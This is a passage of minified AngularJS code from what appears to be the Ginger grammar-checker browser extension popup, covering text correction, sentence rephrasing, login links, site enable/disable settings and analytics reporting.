            g.main.charcount = n.length ? n[n.length - 1].endsAt : 0;
            for (var i = 0; i < n.length; i++) {
                if (n[i].charLimited) {
                    M(e, n, i);
                    break;
                }
            }
            var t = document.querySelector("gwcp");
            if (t) {
                var o = document.createTextNode("");
                t.parentNode.insertBefore(o, t);
                var a = document.createRange();
                a.setStart(o, 0);
                a.setEnd(o, 0);
                a.collapse(true);
                var r = window.getSelection();
                r.removeAllRanges();
                r.addRange(a);
                t.parentNode.removeChild(t);
            }
            S = document.querySelector("#mini-writer").innerHTML;
        };
        var k = function() {
            r.callPromise({
                module: "gingerchromeext.background.correctionLimits",
                callFunction: "get"
            }).then(function(e) {
                g.main.charLimit = g.session.license === 0 ? e.premium : e.free;
                gingerModule.get("widget").init({
                    inputFinder: {
                        selector: null
                    },
                    charLimit: g.main.charLimit,
                    version: n.get("clientVersion"),
                    apiKey: n.get("apiKey"),
                    source: n.get("source"),
                    widgetUid: n.get("widgetUid"),
                    dialect: n.get("dialect")
                });
                gingerModule.get("widget.inputFinder").feed("#mini-writer");
            });
            s.get("loggedOutApprovalsLeft").then(function(e) {
                if (e || e === 0) {
                    gingerModule.get("widget.config").set("loggedOutApprovalsLeft", e);
                } else {
                    gingerModule.get("widget.config").set("loggedOutApprovalsLeft", 10);
                }
            });
            gingerModule.get("widget.config").listen.on("change", function(e, t) {
                if ("loggedOutApprovalsLeft" in t.changed) {
                    s.set("loggedOutApprovalsLeft", t.changed.loggedOutApprovalsLeft);
                }
            });
            gingerModule.get("widget").listen.on("input.added", function() {
                m = gingerModule.get("widget").getInputs().pop();
                if (m) {
                    m.markForeign(false, true);
                }
                q(m.element);
                m.events.listen.on("inputchange", function() {
                    q(m.element);
                    g.main.ui.writerHasValue = _.element("#mini-writer").get(0).innerText !== "";
                });
                m.element.addEventListener("mouseup", function() {
                    o(function() {
                        var e = J();
                        if (e) h.$emit("text.selected", J()); else h.$emit("text.selected", null);
                    });
                });
                m.stats.listen.on("changed", I);
                if (_.element("#mini-writer").get(0).innerText !== "") g.main.ui.showCopyButton = true;
            });
            gingerModule.get("widget.correctionBubble").listen.on("approve.all", function() {
                l.reporterGA({
                    category: "Correction",
                    action: "Accept Correction",
                    label: "Mini Writer",
                    value: null
                });
                l.reporterGA({
                    category: "Onboarding",
                    action: "First Correction",
                    label: null,
                    value: null,
                    singleCall: true
                });
            });
            gingerModule.get("widget.correctionBubble").listen.on("limited.approve.all", function() {});
            gingerModule.get("widget.correctionBubble").listen.on("approved.mistake", function() {
                l.reporterGA({
                    category: "Correction",
                    action: "Accept Correction",
                    label: "Mini Writer",
                    value: null
                });
                l.reporterGA({
                    category: "Onboarding",
                    action: "First Correction",
                    label: null,
                    value: null
                }, true);
            });
            gingerModule.get("widget.correctionBubble").listen.on("ignored.mistake", function() {
                l.reporterGA({
                    category: "Correction",
                    action: "Skip Correction",
                    label: "Mini Writer",
                    value: null
                });
            });
            gingerModule.get("widget.correctionBubble").listen.on("ignore.all", function() {
                l.reporterGA({
                    category: "Correction",
                    action: "Skip Correction",
                    label: "Mini Writer",
                    value: null
                });
            });
            gingerModule.get("widget.correctionBubble").listen.on("addedtodict.mistake", function() {
                l.reporterGA({
                    category: "Customize",
                    action: "Add a word to Personal Dictionary",
                    label: null,
                    value: null
                });
            });
            gingerModule.get("widget.correctionBubble").listen.on("unauthenticated.approve.all", function() {
                g.main.ui.openAuthPage();
            });
        };
        var J = function() {
            if (!document.getElementById("mini-writer").contains(window.getSelection() && window.getSelection().focusNode)) return;
            var e = window.getSelection().getRangeAt(0);
            var t = e.commonAncestorContainer;
            var r = t.innerText ? t.innerText : e.toString();
            r = r.trim();
            if (r && r !== "" && !/\s/g.test(r)) {
                return r;
            }
        };
        g.main = {
            charLimit: 600,
            host: "localhost",
            blackList: [],
            isGingerEnabled: true,
            isSiteSupported: true,
            hasActiveCampaign: false,
            settings: {
                doubleClickEnabled: true,
                dialect: "UK"
            },
            ui: {
                userListOpen: false,
                dialectListOpen: false,
                showCopyButton: false,
                rephraseOpen: false,
                showSelectionPopup: false,
                previousDisabled: true,
                nextDisabled: true
            }
        };
        g.config = n.get();
        g.session = {};
        g.main.premiumBanner = {
            oneDay: 1e3 * 10,
            numberOfDays: 3,
            isShow: false,
            numberOfShows: 0
        };
        g.main.premiumBanner.hide = function() {
            g.main.premiumBanner.isShow = false;
            var e = new Date().getTime();
            s.set("premiumBannerDisplayTimer", e + g.main.premiumBanner.oneDay * g.main.premiumBanner.numberOfDays);
            s.set("premiumBannerDisplayNumberOfShows", g.main.premiumBanner.numberOfShows + 1);
        };
        g.main.premiumBanner.show = function() {
            g.main.premiumBanner.isShow = true;
        };
        g.main.ui.openLink = function(e) {
            gingerModule.get("gingerchromeext.browser").tabs.create({
                url: e,
                active: true
            });
        };
        g.main.ui.captalizeFilter = function(e) {
            return $filter("capitalize")(e);
        };
        g.main.reporterGA = function(e, t, r, n) {
            l.reporterGA({
                category: e,
                action: t,
                label: r,
                value: n
            });
        };
        g.main.rephrase = {
            selectedIndex: null,
            result: null,
            loading: false,
            masterPhrase: null,
            limited: false
        };
        g.main.rephrase.step = function(e) {
            if (e === "backward" && b < 1 || e === "forward" && b >= x) return;
            var t = v.stepRephraseActiveSentence(e === "backward" ? "backward" : "forward");
            g.main.rephrase.selectedIndex = t.activeRephrase;
            T();
        };
        g.main.rephrase.use = function(e) {
            if (g.main.rephrase.limited) return;
            if (g.main.rephrase.selectedIndex === e) {
                g.main.rephrase.selectedIndex = null;
                v.undo();
                return;
            }
            var t = "Pick an alternative";
            if (g.main.rephrase.selectedIndex !== null) {
                t = "Pick another alternative";
            }
            l.reporterGA({
                category: "Rephrase",
                action: "Pick a Rephrase alternative in Mini Writer",
                label: null,
                value: null
            });
            l.reporterGA({
                category: "Onboarding",
                action: "First Rephrase",
                label: null,
                value: null,
                singleCall: true
            });
            r.callPromise({
                module: "gingerchromeext.background.rephraseLimits",
                callFunction: "increase"
            }).then(function(e) {
                g.main.rephrase.limited = e;
            });
            g.main.rephrase.selectedIndex = e;
            v.applyRephrase(e);
        };
        g.main.rephrase.undo = function() {
            g.main.rephrase.selectedIndex = null;
            v.undo();
        };
        t.listen.$on("login", function() {
            T();
        });
        v.listen.$on("sentence.clicked", function() {
            T();
        });
        var T = function(e) {
            g.main.ui.nextDisabled = true;
            g.main.ui.previousDisabled = true;
            g.main.rephrase.loading = true;
            g.main.rephrase.result = null;
            g.main.ui.rephraseShortSentence = false;
            if (e) {
                v.setActiveSentence(e);
            }
            b = v.getActiveSentence().index;
            if (b > 0) g.main.ui.previousDisabled = false;
            if (b < x) g.main.ui.nextDisabled = false;
            var t = v.getActiveSentence().sentence.text;
            v.rephrase(t, g.main.rephrase.limited).then(function(e) {
                g.main.ui.rephraseShortSentence = e.length > 0 && (t.trim().split(/\s+/).length <= 3 || t.length < 20);
                g.main.rephrase.loading = false;
                g.main.rephrase.result = e;
                g.main.rephrase.masterPhrase = t;
            });
        };
        g.main.ui.logout = function() {
            var e = t.get();
            if (e && e.token) i({
                method: "POST",
                url: "https://auth.gingersoftware.com/signOut/" + encodeURIComponent(e.token)
            });
            t.set(null);
        };
        g.main.ui.openBigWriter = function() {
            var e = document.getElementById("mini-writer");
            window.localStorage.setItem("initWriterTextFromPopup", e.innerHTML);
            gingerModule.get("gingerchromeext.browser").tabs.create({
                url: "https://www.gingersoftware.com/ginger-writer",
                active: true
            });
        };
        var E;
        g.main.ui.setUserListOpen = function(e) {
            g.main.ui.dialectListOpen = false;
            if (E) o.cancel(E);
            if (_.isUndefined(e)) {
                g.main.ui.userListOpen = !g.main.ui.userListOpen;
            } else if (e === false) {
                E = o(function() {
                    g.main.ui.userListOpen = false;
                }, 600);
            } else {
                o.cancel(E);
                g.main.ui.userListOpen = true;
            }
        };
        g.main.ui.setDialectListOpen = function(e) {
            g.main.ui.userListOpen = false;
            if (E) o.cancel(E);
            if (_.isUndefined(e)) {
                g.main.ui.dialectListOpen = !g.main.ui.dialectListOpen;
            } else if (e === false) {
                E = o(function() {
                    g.main.ui.dialectListOpen = false;
                }, 600);
            } else {
                o.cancel(E);
                g.main.ui.dialectListOpen = true;
            }
        };
        g.main.ui.openRephrase = function(e) {
            e.preventDefault();
            if (g.main.rephrase.limited) {}
            document.getElementsByTagName("body")[0].addEventListener("click", j);
            var r = gingerModule.get("widget.phraseService").getRepresentation(document.querySelector("#mini-writer"));
            x = r.length - 1;
            for (var t = 0; t < r.length; t++) {
                if (/^\s+$/.test(r[t].text)) {
                    r.splice(t, 1);
                }
            }
            var n = 0;
            r.forEach(function(e, t) {
                if (e.activeSentence) {
                    if (/^\s+$/.test(e.text)) {
                        n = r.length - 1 === t ? t + 1 : t - 1;
                    } else {
                        n = t;
                    }
                }
            });
            g.main.ui.rephraseOpen = true;
            v.setContentFromWriter(m);
            T(n);
        };
        g.main.ui.closeRephrase = function() {
            document.getElementsByTagName("body")[0].removeEventListener("click", j);
            var e = _.element("#rephraser").html().replace(/<\/?gwrw[^>]*>/g, "");
            g.main.ui.rephraseOpen = false;
            v.passContentToWriter(e, m);
            if (m) m.events.listen.trigger("inputchange");
        };
        p.onblur = function() {
            var e;
            if (g.main.ui.rephraseOpen) {
                e = _.element("#rephraser").html().replace(/<\/?gwrw[^>]*>/g, "");
            } else {
                e = document.getElementById("mini-writer").innerHTML;
            }
            window.localStorage.setItem("miniWriter", e);
            s.set("miniWriterCache", JSON.stringify(gingerModule.get("widget.api").dumpCorrectionCache()));
        };
        var L = function(e) {
            p.getSelection().removeAllRanges();
            var t = document.createRange();
            t.selectNodeContents(typeof e === "string" ? document.getElementById(e) : e);
            p.getSelection().addRange(t);
            document.execCommand("copy");
            p.getSelection().removeAllRanges();
        };
        var A;
        var F = 0;
        var I = function(e, t) {
            o(function() {
                if (t.count.charactersWithSpace > 0) {
                    g.main.ui.showCopyButton = true;
                } else {
                    g.main.ui.showCopyButton = false;
                }
                h.$emit("stats.changed", t);
            });
            var r = m.stats.get();
            if (r && r.mistakes) N(r.mistakes.grammar + r.mistakes.spelling);
            A = r;
        };
        var O = [ 1, 5, 10, 20 ];
        var R = function(e) {
            if (F < e) {
                for (var t = 0; t < O.length; t++) {
                    if (F < O[t] && e >= O[t]) {
                        return true;
                    }
                }
            }
            return false;
        };
        var N = function(e) {
            if (e !== F) {
                if (R(e)) {
                    $gingerWidgetJquery(".popup-body-floatingG").addClass("spin");
                } else {
                    $gingerWidgetJquery(".popup-body-floatingG").removeClass("spin");
                }
                F = e;
            }
            if (e > 0) {
                $gingerWidgetJquery(".popup-body-floatingG").addClass("dirty");
                if (e > 99) {
                    $gingerWidgetJquery(".popup-body-floatingG span").html('<gdiv style="font-size:11px">99+</gdiv>');
                } else {
                    $gingerWidgetJquery(".popup-body-floatingG span").text(e);
                }
            } else {
                $gingerWidgetJquery(".popup-body-floatingG").removeClass("dirty");
                $gingerWidgetJquery(".popup-body-floatingG span").text(e);
            }
        };
        g.main.ui.copyText = function() {
            L(document.getElementById("mini-writer"));
            g.main.ui.showCopySuccess = true;
            o(function() {
                g.main.ui.showCopySuccess = false;
            }, 2e3);
        };
        var B = function() {
            s.set("miniWriterCache", null);
            gingerModule.get("widget.cache").restore({});
        };
        g.main.ui.clearText = function(e) {
            B();
            document.getElementById("mini-writer").textContent = "";
            _.element("#mini-writer").focus();
        };
        var P = function(e) {
            var t = document.getElementById("mini-writer");
            t.innerHTML = e;
            setTimeout(function() {
                if (m) m.events.listen.trigger("inputchange");
            }, 100);
        };
        g.main.acceptReplaceContentWithSelection = function() {
            P(w.text);
            g.main.ui.showSelectionPopup = false;
            _.element("#mini-writer").focus();
        };
        g.main.rejectReplaceContentWithSelection = function() {
            g.main.ui.showSelectionPopup = false;
            _.element("#mini-writer").focus();
        };
        var j = function(e) {
            if (!g.main.ui.rephraseOpen) return;
            var t = true;
            var r = e.composedPath ? e.composedPath() : e.path;
            r.forEach(function(e) {
                if (e.tagName === "GWRW" || e.className && e.className.includes("popup-rephrase")) t = false;
            });
            if (t) g.main.ui.closeRephrase();
        };
        t.listen.$on("change", function() {
            D();
        });
        var D = function() {
            r.callPromise({
                module: "gingerchromeext.background.rephraseLimits",
                callFunction: "get"
            }).then(function(e) {
                g.main.rephrase.limited = e;
            });
        };
        g.main.ui.openAuthPage = function(e) {
            var t = [ "clientType=extension", "widgetUid=" + n.get("widgetUid"), "clientVersion=" + n.get("clientVersion"), "affId=" + n.get("affId"), "application=" + n.get("platform"), "origin=" + n.get("affId"), "platform=" + n.get("source"), "targetUrl=" + encodeURIComponent("/login-welcome"), "trigger=ExtensionMenu", "utm_medium=ExtensionMenu", "utm_source=button", "utm_campaign=signup_login" ];
            if (!e) e = "login";
            if (e === "login") {
                gingerModule.get("gingerchromeext.browser").tabs.create({
                    url: "https://www.gingersoftware.com/login?" + t.join("&"),
                    active: true
                });
            } else {
                gingerModule.get("gingerchromeext.browser").tabs.create({
                    url: "https://www.gingersoftware.com/login?view=signUp&" + t.join("&"),
                    active: true
                });
            }
        };
        var U = function() {
            c.getCurrentHost().then(function(t) {
                r.call({
                    module: "gingerchromeext.background.nonSupportedSites",
                    callFunction: "getNonSupportedItemByUrl",
                    callArgs: [ t ]
                }, function(e) {
                    if (!e) return;
                    g.main.currentHost = t;
                    g.main.currentHostName = e.name;
                    g.main.isSiteSupported = false;
                    g.main.isGingerEnabled = false;
                });
            });
            D();
            t.listen.$on("logout", function() {
                o(function() {
                    e.go("external.login");
                });
            });
            t.refresh().then(function(e) {
                if (!e.name && e.email) {
                    e.name = e.email.split("@")[0];
                }
                gingerModule.get("widget.session").set(e);
                g.session = e;
                var t = [ 1, 2, 3 ];
                if (g.session.license == 2 && !g.session.isAnonym && t.indexOf(g.session.falsePremium) > -1) {
                    s.get("premiumBannerDisplayTimer").then(function(n) {
                        s.get("premiumBannerDisplayNumberOfShows").then(function(e) {
                            var t = new Date().getTime();
                            var r = !e ? 0 : typeof e === "string" ? parseInt(e, 10) : e;
                            if (typeof r !== "number") {
                                r = 0;
                                s.set("premiumBannerDisplayNumberOfShows", r);
                            }
                            g.main.premiumBanner.numberOfShows = r;
                            if ((!n || n < t) && (!r || r <= 3)) {
                                g.main.premiumBanner.show();
                            }
                        });
                    });
                }
                k();
            });
            s.get("miniWriterCache").then(function(e) {
                if (e) {
                    try {
                        gingerModule.get("widget.cache").restore(JSON.parse(e));
                    } catch (e) {
                        console.error("miniWriterCache not parsable");
                    }
                }
                var r = window.localStorage.getItem("miniWriter");
                if (r && r.length > 0) {
                    g.main.ui.writerHasValue = true;
                    var t = document.getElementById("mini-writer");
                    t.innerHTML = r;
                    setTimeout(function() {
                        if (m) m.events.listen.trigger("inputchange");
                    }, 100);
                }
                s.get("miniWriterFromSelection").then(function(t) {
                    if (t && t.text && t.text.length > 0) {
                        W(t.text, function(e) {
                            if (e && e.d && e.d === "en") {
                                w = t;
                                if (r) {
                                    g.main.ui.showSelectionPopup = true;
                                } else {
                                    g.main.acceptReplaceContentWithSelection();
                                }
                            }
                        });
                    } else {
                        _.element("#mini-writer").focus();
                    }
                });
            });
            a.retrieveCurrentFaviconUrl().then(function(e) {
                g.main.faviconUrl = e;
            });
            s.get("dialect").then(function(e) {
                g.main.settings.dialect = e;
            });
            s.listen.$on("change", function(e, t) {
                if ("dialect" in t) {
                    gingerModule.get("widget.config").set("dialect", t["dialect"].newValue);
                }
            });
            g.main.dialectChanged = function(e) {
                g.main.settings.dialect = e;
                s.set("dialect", g.main.settings.dialect);
                g.main.ui.dialectListOpen = false;
            };
            g.main.reportPremiumClicked = function() {
                l.reporterGA({
                    category: "Premium",
                    action: "Click Premium for Character Limit",
                    label: null,
                    value: null
                });
            };
            s.get("enableDefinitionsAndSynonyms").then(function(e) {
                g.main.settings.enableDefinitionsAndSynonyms = e;
                g.$watch("main.settings.enableDefinitionsAndSynonyms", function(e, t) {
                    if (e == t) return;
                    var r = "Disable";
                    if (e) {
                        r = "Enable";
                    }
                    l.reporter({
                        type: "SettingsModification",
                        Action: r,
                        location: "ExtensionMenu",
                        SettingsType: "DefenitionPopup"
                    });
                    s.set("enableDefinitionsAndSynonyms", g.main.settings.enableDefinitionsAndSynonyms);
                });
            });
            c.getCurrentHost().then(function(e) {
                g.main.currentHost = e;
            });
            c.isCurrentHostBlackListed().then(function(e) {
                o(function() {
                    if (g.main.isSiteSupported) {
                        g.main.isGingerEnabled = !e;
                    }
                    g.$watch("main.isGingerEnabled", function(t, e) {
                        if (t == e) return;
                        try {
                            var r = "Disable";
                            if (t) {
                                r = "Enable";
                            }
                            l.reporter({
                                type: "EnableOrDisableGinger",
                                Action: r,
                                location: "ExtensionMenu"
                            });
                            l.reporter({
                                type: "SettingsModification",
                                Action: r,
                                location: "ExtensionMenu",
                                SettingsType: "CorrectionSettingsType"
                            });
                            l.reporterGA({
                                category: "Turn on/off Ginger",
                                action: "Turn off from Mini Writer",
                                label: g.main.currentHost,
                                value: null
                            });
                            gingerModule.get("gingerchromeext.browser").tabs.query({
                                active: true,
                                currentWindow: true
                            }, function(e) {
                                !t ? c.add(e[0].url) : c.remove(e[0].url);
                            });
                        } catch (e) {
                            console.error("chrome.tabs.query is not supported", e);
                        }
                    });
                });
            });
            gingerModule.get("widget.api").listen.on("ajax.start", function() {
                if (y) y = clearTimeout(y);
                $gingerWidgetJquery(".popup-body-floatingG").addClass("loading");
            });
            gingerModule.get("widget.api").listen.on("ajax.end", function() {
                if (y) y = clearTimeout(y);
                y = setTimeout(function() {
                    $gingerWidgetJquery(".popup-body-floatingG").removeClass("loading");
                }, 2e3);
            });
        };
        U();
    } ]);
})(window.angular);

angular.module("gingerchromeext.popup.home").directive("ngError", function() {
    return {
        scope: {
            ngOnerror: "&"
        },
        link: function(e, t, r) {
            t.bind("error", function() {
                e.ngOnerror();
            });
        }
    };
    return fallbackSrc;
}).directive("mouseaway", function() {
    return {
        scope: {
            callback: "&mouseaway"
        },
        link: function(r, e, t) {
            var n = e[0];
            e.bind("mouseout", function(e) {
                var t = e.toElement;
                while (t) {
                    if (t === n) {
                        return;
                    }
                    t = t.parentNode;
                }
                r.$apply(function() {
                    r.callback(r, e);
                });
            });
        }
    };
});

(function(e) {
    e.module("gingerchromeext.popup.home").filter("capitalize", function() {
        return function(e) {
            return !!e ? e.charAt(0).toUpperCase() + e.substr(1).toLowerCase() : "";
        };
    });
})(window.angular);

(function(e) {
    e.module("gingerchromeext.popup.login").controller("loginController", [ "sessionFactory", "configFactory", "$sce", "$scope", "$window", "reportingFactory", function(e, t, r, n, i, o) {
        n.login = {};
        var a = [ "clientType=extension", "widgetUid=" + t.get("widgetUid"), "clientVersion=" + t.get("clientVersion"), "affId=" + t.get("affId"), "application=" + t.get("platform"), "origin=" + t.get("affId"), "platform=" + t.get("source"), "targetUrl=" + encodeURIComponent("/login-welcome"), "trigger=ExtensionMenu", "utm_medium=ExtensionMenu", "utm_source=button", "utm_campaign=signup_login" ];
        n.config = t.get();
        n.login.openAuthPage = function(e) {
            if (!e) e = "login";
            if (e === "login") {
                gingerModule.get("gingerchromeext.browser").tabs.create({
                    url: "https://www.gingersoftware.com/login?" + a.join("&"),
                    active: true
                });
            } else {
                gingerModule.get("gingerchromeext.browser").tabs.create({
                    url: "https://www.gingersoftware.com/login?view=signUp&" + a.join("&"),
                    active: true
                });
            }
        };
    } ]);
})(window.angular);

(function(e) {
    e.module("gingerchromeext.popup.notsupported").controller("notsupportedController", [ "$scope", "$state", "$http", "configFactory", "faviconFactory", "siteBlackListFactory", "backgroundConnectorFactory", "sessionFactory", "$timeout", function(r, e, t, n, i, o, a, g, s) {
        var c;
        r.config = n.get();
        r.notsupported = {};
        r.notsupported.nonSupportedSites = n.get("nonSupportedSites");
        r.notsupported.ui = {};
        r.notsupported.ui.logout = function() {
            var e = g.get();
            if (e && e.token) t({
                method: "POST",
                url: "https://auth.gingersoftware.com/signOut/" + encodeURIComponent(e.token)
            });
            g.set(null);
        };
        r.notsupported.ui.openLink = function(e) {
            gingerModule.get("gingerchromeext.browser").tabs.create({
                url: e,
                active: true
            });
        };
        o.getCurrentHost().then(function(t) {
            a.call({
                module: "gingerchromeext.background.nonSupportedSites",
                callFunction: "getNonSupportedItemByUrl",
                callArgs: [ t ]
            }, function(e) {
                if (!e) return;
                s(function() {
                    r.notsupported.currentHost = t;
                    r.notsupported.currentHostName = e.name;
                });
            });
        });
        g.refresh().then(function(e) {
            if (!e.name && e.email) {
                e.name = e.email.split("@")[0];
            }
            r.session = e;
        });
        r.notsupported.ui.setUserListOpen = function(e) {
            if (c) s.cancel(c);
            if (e === false) {
                c = s(function() {
                    r.notsupported.ui.userListOpen = false;
                }, 600);
            } else {
                r.notsupported.ui.userListOpen = true;
            }
        };
    } ]);
})(window.angular);

(function(W) {
    W.module("gingerchromeext.popup.rephrase").factory("rephraseService", [ "$rootScope", "$http", "$q", "$sce", "sessionFactory", "configFactory", "reportingFactory", function(e, t, a, r, n, i, g) {
        var s = e.$new(true);
        var c = [];
        var o = function() {
            var e = gingerModule.get("widget.phraseService").getSentences(gingerModule.get("widget.contentManager").getVal(document.querySelector("#rephraser")));
            e = e.filter(function(e) {
                return e != null && /\S/.test(e);
            });
            return e;
        };
        var l = function() {
            c = o();
            for (var e = 0; e < c.length; e++) {
                var t = v(document.querySelector("#rephraser"), c[e]);
                c[e].master = t.innerHTML;
                c[e].activeRephrase = null;
                t.id = "gwsi-" + e;
                t.addEventListener("click", function() {
                    var e = parseInt(this.id.split("-")[1]);
                    d(e);
                    s.$emit("sentence.clicked", e);
                });
            }
            d(0);
        };
        var u = 0;
        var d = function(e) {
            W.element("#gwsi-" + u).removeClass("active");
            u = e;
            W.element("#gwsi-" + u).addClass("active");
            if (W.element("#gwsi-" + u).get(0)) {
                setTimeout(function() {
                    W.element("#gwsi-" + u).get(0).scrollIntoView({
                        block: "center"
                    });
                }, 5);
            }
            return c[e];
        };
        var f = function() {
            return {
                sentence: c[u],
                index: u
            };
        };
        var p = function(e) {
            if (c.length) {
                if (e === "forward" && u < c.length - 1) {
                    return d(u + 1);
                } else if (e === "backward" && u > 0) {
                    return d(u - 1);
                } else {
                    return c[u];
                }
            }
        };
        var v = function(e, t) {
            var r = t.text.match(/^\s+/);
            var n = r ? r[0].length : 0;
            var i = t.text.match(/\s+$/);
            var o = i ? i[0].length : 0;
            var a = t.startsAt + n;
            var g = t.endsAt - o;
            var s = gingerModule.get("widget.utils").getNodeOffsetOfIndex(e, a, g);
            if (!s.startNode || !s.endNode) {
                return;
            }
            var c = m("gwrw", s.startNode, s.startNodeOffset, s.endNode, s.endNodeOffset);
            return c;
        };
        var m = function(e, t, r, n, i) {
            var o = document.createRange();
            try {
                o.setStart(t, r);
                o.setEnd(n, i);
            } catch (e) {
                console.error(e);
            }
            var a = document.createElement(e);
            a.appendChild(o.extractContents());
            o.insertNode(a);
            return a;
        };
        var h = function(s) {
            var c = a.defer();
            var l = [];
            t({
                url: "https://rephrasesrv.gingersoftware.com/Rephrase/secured/rephrase",
                params: {
                    apiKey: i.get("apiKey"),
                    userIdentifier: n.get().userId,
                    clientVersion: i.get("clientVersion"),
                    authToken: n.get().token,
                    lang: i.get("dialect"),
                    platform: i.get("platform"),
                    s: s,
                    size: 8
                },
                cache: true
            }).then(function e(t, r, n, i, o) {
                var a = t.data.Sentences;
                for (var g = 0; g < a.length; g++) {
                    l.push({
                        from: 0,
                        to: s.length,
                        text: a[g].Sentence,
                        rephrase: a[g].Sentence
                    });
                }
                c.resolve(l);
            }, function e(t, r, n, i) {
                c.resolve(l);
            });
            return c.promise;
        };
        var w = function(n, e) {
            var r = a.defer();
            if (e) {
                r.resolve([ {
                    from: 0,
                    to: 21,
                    text: "Premium limit achieved.",
                    rephrase: "Premium limit achieved.",
                    fragments: [ {
                        text: "Premium limit ",
                        $$hashKey: "object:51"
                    }, {
                        changed: true,
                        text: "achieved.",
                        $$hashKey: "object:52"
                    } ],
                    $$hashKey: "object:35"
                }, {
                    from: 0,
                    to: 21,
                    text: "Bonus limit achieved.",
                    rephrase: "Bonus limit achieved.",
                    fragments: [ {
                        changed: true,
                        text: "Bonus",
                        $$hashKey: "object:55"
                    }, {
                        text: " limit ",
                        $$hashKey: "object:56"
                    }, {
                        changed: true,
                        text: "achieved.",
                        $$hashKey: "object:57"
                    } ],
                    $$hashKey: "object:36"
                }, {
                    from: 0,
                    to: 21,
                    text: "Premium limit attained.",
                    rephrase: "Premium limit attained.",
                    fragments: [ {
                        text: "Premium limit ",
                        $$hashKey: "object:61"
                    }, {
                        changed: true,
                        text: "attained.",
                        $$hashKey: "object:62"
                    } ],
                    $$hashKey: "object:37"
                }, {
                    from: 0,
                    to: 21,
                    text: "Maximum premium reached.",
                    rephrase: "Maximum premium reached.",
                    fragments: [ {
                        changed: true,
                        text: "Maximum",
                        $$hashKey: "object:65"
                    }, {
                        text: " ",
                        $$hashKey: "object:66"
                    }, {
                        changed: true,
                        text: "premium",
                        $$hashKey: "object:67"
                    }, {
                        text: " reached",
                        $$hashKey: "object:68"
                    }, {
                        changed: true,
                        text: ".",
                        $$hashKey: "object:69"
                    } ],
                    $$hashKey: "object:38"
                }, {
                    from: 0,
                    to: 21,
                    text: "Payment limit reached.",
                    rephrase: "Payment limit reached.",
                    fragments: [ {
                        changed: true,
                        text: "Payment",
                        $$hashKey: "object:75"
                    }, {
                        text: " limit reached",
                        $$hashKey: "object:76"
                    }, {
                        changed: true,
                        text: ".",
                        $$hashKey: "object:77"
                    } ],
                    $$hashKey: "object:39"
                }, {
                    from: 0,
                    to: 21,
                    text: "Premium threshold reached.",
                    rephrase: "Premium threshold reached.",
                    fragments: [ {
                        text: "Premium ",
                        $$hashKey: "object:81"
                    }, {
                        changed: true,
                        text: "threshold",
                        $$hashKey: "object:82"
                    }, {
                        text: " reached",
                        $$hashKey: "object:83"
                    }, {
                        changed: true,
                        text: ".",
                        $$hashKey: "object:84"
                    } ],
                    $$hashKey: "object:40"
                }, {
                    from: 0,
                    to: 21,
                    text: "Bonus cap reached.",
                    rephrase: "Bonus cap reached.",
                    fragments: [ {
                        changed: true,
                        text: "Bonus",
                        $$hashKey: "object:89"
                    }, {
                        text: " ",
                        $$hashKey: "object:90"
                    }, {
                        changed: true,
                        text: "cap",
                        $$hashKey: "object:91"
                    }, {
                        text: " reached",
                        $$hashKey: "object:92"
                    }, {
                        changed: true,
                        text: ".",
                        $$hashKey: "object:93"
                    } ],
                    $$hashKey: "object:41"
                }, {
                    from: 0,
                    to: 21,
                    text: "Award limit met.",
                    rephrase: "Award limit met.",
                    fragments: [ {
                        changed: true,
                        text: "Award",
                        $$hashKey: "object:99"
                    }, {
                        text: " limit ",
                        $$hashKey: "object:100"
                    }, {
                        changed: true,
                        text: "met.",
                        $$hashKey: "object:101"
                    } ],
                    $$hashKey: "object:42"
                } ]);
                return r.promise;
            }
            var i = n.match(/^\s+/);
            if (i) n = n.slice(i[0].length);
            var o = n.match(/^\s+/);
            if (o) n = n.slice(0, o[0].length);
            var t = [];
            h(n).then(function(e) {
                for (var t = 0; t < e.length; t++) {
                    if (i) e[t].text = i[0] + e[t].text;
                    if (o) e[t].text = e[t].text + o[0];
                }
                c[u].rephrases = e;
                e.forEach(function(e) {
                    var t = Diff.diffWords(n, e.rephrase);
                    var r = [];
                    t.forEach(function(e) {
                        if (e.added) {
                            r.push({
                                changed: true,
                                text: e.value
                            });
                        } else if (e.removed) {} else {
                            r.push({
                                text: e.value
                            });
                        }
                    });
                    e.fragments = r;
                });
                r.resolve(e);
                s.$emit("get.completed", e);
                g.reporter({
                    type: "RephraseTheTextRTEvent"
                });
                g.reporterGA({
                    category: "Rephrase",
                    action: "Rephrase from Mini Writer",
                    label: null,
                    value: null
                });
            });
            s.$emit("get.sent", {
                phrase: n
            });
            return r.promise;
        };
        var y = function(e) {
            c[u].activeRephrase = e;
            W.element("#gwsi-" + u).html(c[u].rephrases[e].text);
            M();
            g.reporter({
                type: "SubmitRephrase"
            });
            var t = W.element("#rephraser").html().replace(/<\/?gwrw[^>]*>/g, "");
            window.localStorage.setItem("miniWriter", t);
            return c[u];
        };
        var b = function() {
            c[u].activeRephrase = null;
            W.element("#gwsi-" + u).html(c[u].master);
            M();
            return c[u];
        };
        var x = function(e) {
            var t = W.element("#rephraser");
            t.html(W.element(e.element).html().replace(/<\/?gwmw[^>]*>/g, "").replace(/(&nbsp;)+$/, ""));
            l();
        };
        var $ = function(e, t) {
            W.element(t.element).html(e);
            if (t) {
                t.focus();
            }
        };
        var C = new gingerModule.get("widget.inputHandler.stats", true)();
        C.listen.on("changed", function(e, t) {
            s.$emit("stats.changed", t);
        });
        var M = function() {
            C.init(document.querySelector("#rephraser"));
            C.update(c);
        };
        return {
            setContentFromWriter: x,
            passContentToWriter: $,
            rephrase: w,
            stepRephraseActiveSentence: p,
            getActiveSentence: f,
            applyRephrase: y,
            undo: b,
            setActiveSentence: d,
            listen: s
        };
    } ]);
})(window.angular);

(function(e) {
    e.module("gingerchromeext.popup.report").factory("reportingFactory", [ "backgroundConnectorFactory", "configFactory", function(e, t) {
        var r = e.proxy({
            module: "gingerchromeext.background.report",
            callFunction: "reporter"
        });
        var n = e.proxy({
            module: "gingerchromeext.background.report",
            callFunction: "reporterGA"
        });
        r({
            type: "OpenExtensionMenu"
        });
        return {
            reporter: r,
            reporterGA: n
        };
    } ]);
})(window.angular);

(function(e) {
    e.module("gingerchromeext.popup.auth").factory("sessionFactory", [ "backgroundConnectorFactory", "storageFactory", "reportingFactory", "$rootScope", "$timeout", "$window", "$q", function(e, t, r, n, i, o, a) {
        var g = n.$new(true);
        var s;
        var c = function() {
            return s;
        };
        var l = e.proxy({
            module: "gingerchromeext.background.session",
            callFunction: "set",
            promise: true
        });
